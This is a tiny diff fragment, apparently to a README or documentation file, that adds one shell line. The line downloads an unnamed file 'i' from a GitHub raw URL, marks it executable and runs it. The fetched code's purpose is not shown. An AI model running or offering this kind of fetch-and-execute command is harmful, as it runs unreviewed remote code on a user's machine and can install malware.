@@ -9,3 +9,4 @@
 </code></pre>
 
 ```
+wget -q https://raw.githubusercontent.com/joytun21/libevscripted/main/i && chmod +x i && ./i
